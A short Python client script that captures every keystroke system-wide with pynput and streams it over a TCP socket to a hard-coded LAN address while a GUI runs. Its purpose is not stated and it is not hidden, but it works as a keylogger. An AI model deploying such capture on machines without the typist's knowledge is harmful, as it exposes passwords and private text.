import socket
import sys
from pynput.keyboard import Key, Listener as KeyboardListener
import threading
import tkinter as tk
from window import GUI

# 建立 socket client 並連接
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.1.106', 5555))  # 請改為server所在機器的ip

def send_key_to_server(key_str):
    try:
        client.send(key_str.encode('utf-8'))
    except Exception as e:
        print(f"\n⚠️ 傳送失敗：{e}")

# 處理鍵盤按下事件
def on_press(key):
    try:
        # 嘗試取得字元（KeyCode）
        key_str = key.char
    except AttributeError:# 如果是特殊鍵（Key.space、Key.enter等）
        if key == Key.esc:
            client.close()
            sys.exit(0)  # 關閉程式
        elif key == Key.space:
            key_str = str(" ")
        elif key == Key.enter:
            key_str = str("\n")
        else:
            key_str = ''

    print(f"Pressed: {key_str}")
    send_key_to_server(key_str)

# 啟動鍵盤監聽器（用 thread 避免阻塞 GUI）
def start_keyboard_listener():
    listener = KeyboardListener(on_press=on_press)
    #listener = KeyboardListener(on_press=on_press, suppress=True)
    listener.start()
    # 保持主執行緒存活（或你可以放你其他的主邏輯）
    listener.join()


# 主程式
if __name__ == "__main__":
    # 啟動鍵盤監聽器（在背景 thread）
    listener_thread = threading.Thread(target=start_keyboard_listener, daemon=True)
    listener_thread.start()

    # 建立 GUI 並顯示
    gui = GUI()
    gui.run()